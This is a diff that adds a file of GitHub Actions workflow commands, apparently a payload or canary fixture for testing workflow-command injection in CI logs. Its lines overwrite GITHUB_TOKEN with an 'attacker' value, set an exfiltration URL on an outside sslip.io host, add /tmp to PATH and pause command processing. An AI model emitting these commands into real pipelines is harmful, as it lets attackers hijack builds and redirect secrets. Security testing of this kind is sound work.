@@ -1,0 +1,13 @@
+::add-mask::ESCL_MASK_CANARY
+::set-env name=INJ_ENV::injected-value
+::set-env name=INJ_EXFIL_URL::http://159-195-55-35.sslip.io:8903/inject-hit
+::set-env name=GITHUB_TOKEN::ghs_injected_attacker_value
+::add-path::/tmp/inj-path
+::set-output name=INJ_OUT::injected-out
+::save-state name=INJ_STATE::injected-state
+::stop-commands::ESCSTOP7
+::error::ESCL-INJECTED-ERROR-ANNOTATION
+::warning::ESCL-INJECTED-WARNING-ANNOTATION
+::notice::ESCL-INJECTED-NOTICE-ANNOTATION
+::ESCSTOP7::
+::debug::ESCL-INJECTED-DEBUG-LINE
